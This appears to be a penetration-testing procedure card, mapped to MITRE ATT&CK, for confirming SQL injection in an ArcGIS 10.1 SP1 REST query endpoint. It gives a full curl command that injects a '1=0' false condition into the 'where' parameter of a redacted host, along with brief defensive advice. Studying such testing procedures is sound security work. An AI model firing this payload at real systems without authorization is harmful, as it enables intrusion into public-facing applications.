---
id: proc-003
tags:
  - sqli
  - validation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-sqli-false]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:26.180Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-SQL-Injection-with-False-Condition

## Summary

This procedure injects a false SQL condition ('1=0') into the 'where' parameter to confirm the injection vulnerability by observing an empty response, proving lack of sanitization.

## Description

Following tautological testing, a false condition like '1=0' should return no results if the parameter influences SQL execution directly. This validates the blind SQLi in ArcGIS 10.1 SP1, where inputs are not escaped, aligning with Esri's known issues.

## Requirements

1. Successful access to the query endpoint
2. Ability to modify and resubmit parameters
3. Comparison tool for response analysis

## Defense

Defensive measures and detection strategies:

- Input validation to reject boolean payloads
- Anomaly detection in query responses (e.g., sudden empty results)
- Regular patching of ArcGIS to address known SQLi flaws

## Objectives

1. Prove parameter controls query logic
2. Confirm unsanitized SQL concatenation
3. Rule out false positives in injection testing

## Instructions

### Step 1: Inject False Payload

**Context**: Set 'where=1=0' (URL-encoded as 1%3D0) to force an empty result set, verifying injection.

**Command** ([[commands/curl-sqli-false]]):
```bash
curl "https://█████/arcgis/rest/services/Data/ANC_External/MapServer/1/query?where=1%3D0&text=&objectIds=&time=&timeRelation=esriTimeRelationOverlaps&geometry=&geometryType=esriGeometryEnvelope&inSR=&spatialRel=esriSpatialRelIntersects&distance=&units=esriSRUnit_Foot&relationParam=&outFields=&returnGeometry=true&returnTrueCurves=false&maxAllowableOffset=&geometryPrecision=&outSR=&havingClause=&returnIdsOnly=false&returnCountOnly=false&orderByFields=&groupByFieldsForStatistics=&outStatistics=&returnZ=false&returnM=false&gdbVersion=&historicMoment=&returnDistinctValues=false&resultOffset=&resultRecordCount=&returnExtentOnly=false&sqlFormat=none&datumTransformation=&parameterValues=&rangeValues=&quantizationParameters=&featureEncoding=esriDefault&f=html"
```

> Expect an empty or 'no records' response, contrasting with normal queries, confirming vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-false]]

## Tools Used


## Tags

- [[sqli]]
- [[validation]]
